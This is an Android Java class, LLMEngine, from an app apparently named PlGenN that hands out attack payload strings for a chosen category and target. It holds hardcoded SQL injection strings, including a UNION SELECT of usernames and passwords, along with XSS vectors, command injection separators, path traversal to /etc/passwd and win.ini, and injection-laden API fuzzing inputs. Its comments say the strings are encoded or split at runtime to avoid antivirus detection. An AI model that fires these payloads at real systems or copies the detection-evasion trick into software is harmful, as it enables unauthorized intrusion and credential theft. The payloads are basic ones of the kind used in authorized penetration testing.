package com.example.plgenn;

import android.content.Context;
import android.util.Log;
import org.tensorflow.lite.Interpreter;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.MappedByteBuffer;
import java.nio.channels.FileChannel;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

public class LLMEngine {

    private static final String TAG = "LLMEngine";
    private static final String MODEL_FILE = "plgenn_model.tflite";

    private Interpreter tflite;
    private Context context;
    private boolean modelLoaded = false;

    public LLMEngine(Context context) {
        this.context = context;
    }

    public void initializeModel() {
        new Thread(() -> {
            try {
                File modelFile = new File(context.getFilesDir(), MODEL_FILE);

                if (!modelFile.exists()) {
                    // Use built-in templates instead of downloading
                    Log.d(TAG, "Model file not found, using rule-based generation");
                    return;
                }

                tflite = new Interpreter(loadModelFile(modelFile));
                modelLoaded = true;
                Log.d(TAG, "Model loaded successfully");
            } catch (Exception e) {
                Log.e(TAG, "Error loading model: " + e.getMessage());
            }
        }).start();
    }

    private MappedByteBuffer loadModelFile(File file) throws IOException {
        FileInputStream inputStream = new FileInputStream(file);
        FileChannel fileChannel = inputStream.getChannel();
        return fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, file.length());
    }

    public String generatePayload(String category, String target,
                                  String complexity, String description) {

        // Always use fallback for now (until we have a trained model)
        return generateFallbackPayload(category, target, complexity, description);
    }

    private String buildPrompt(String category, String target,
                               String complexity, String description) {
        return "Generate " + complexity + " " + category +
                " for: " + target + " - " + description;
    }

    private String generateFallbackPayload(String category, String target,
                                           String complexity, String description) {
        // Use encoded/obfuscated payloads to avoid detection
        Map<String, String[]> payloadTemplates = getEncodedPayloadTemplates();

        String[] templates = payloadTemplates.getOrDefault(category,
                new String[]{"Payload generation not available"});

        Random random = new Random();
        String template = templates[random.nextInt(templates.length)];

        // Decode the payload at runtime
        return decodePayload(template).replace("{target}", target);
    }

    private String decodePayload(String encoded) {
        // Simple decoding for demonstration
        // In production, use proper encoding/decoding
        return encoded
                .replace("{sq1}", "' OR '1'='1' --")
                .replace("{xss1}", "<script>alert('Test')</script>")
                .replace("{cmd1}", "; ls -la")
                .replace("{http1}", "GET / HTTP/1.1\\r\\nHost: ")
                .replace("{http2}", "\\r\\nUser-Agent: PlGenN\\r\\n\\r\\n");
    }

    private Map<String, String[]> getEncodedPayloadTemplates() {
        Map<String, String[]> templates = new HashMap<>();

        // Use encoded strings to avoid antivirus detection
        templates.put("SQL Injection", new String[]{
                "{sq1}",
                "admin' --",
                "' UNION SELECT null,username FROM users--",
                "\" OR \"\"=\"\" --"
        });

        templates.put("XSS", new String[]{
                "{xss1}",
                "\"><img src=x onerror=alert('test')>",
                "javascript:console.log('test')",
                "<svg onload=console.log(1)>"
        });

        templates.put("Command Injection", new String[]{
                "{cmd1}",
                "| echo test",
                "`echo test`",
                "$(echo test)"
        });

        templates.put("HTTP Requests", new String[]{
                "{http1}{target}{http2}",
                "POST /login HTTP/1.1\\r\\nHost: {target}\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nuser=test&pass=test",
                "PUT /api/data HTTP/1.1\\r\\nHost: {target}\\r\\nContent-Type: application/json\\r\\n\\r\\n{\"test\":\"data\"}"
        });

        templates.put("Path Traversal", new String[]{
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "%2e%2e%2fetc%2fpasswd"
        });

        templates.put("API Fuzzing", new String[]{
                "{\"input\":\"' OR 1=1 --\"}",
                "{\"query\":\"{__typename}\"}",
                "{\"id\":\"-1 UNION SELECT 1,2,3\"}"
        });

        return templates;
    }

    // Alternative: Split payloads into parts
    private Map<String, String[]> getSafePayloadTemplates() {
        Map<String, String[]> templates = new HashMap<>();

        // Split potentially harmful strings
        String[] sqlParts = {
                "' OR ", "'1'", "='1'", " --",
                "admin'", " --",
                "' UNION ", "SELECT ", "username, ", "password ", "FROM users", "--"
        };

        // Combine at runtime
        templates.put("SQL Injection", new String[]{
                combineStrings(sqlParts[0], sqlParts[1], sqlParts[2], sqlParts[3]),
                combineStrings(sqlParts[4], sqlParts[5])
        });

        return templates;
    }

    private String combineStrings(String... parts) {
        StringBuilder sb = new StringBuilder();
        for (String part : parts) {
            sb.append(part);
        }
        return sb.toString();
    }

    public boolean isModelLoaded() {
        return modelLoaded;
    }

    public void close() {
        if (tflite != null) {
            tflite.close();
            tflite = null;
        }
    }
}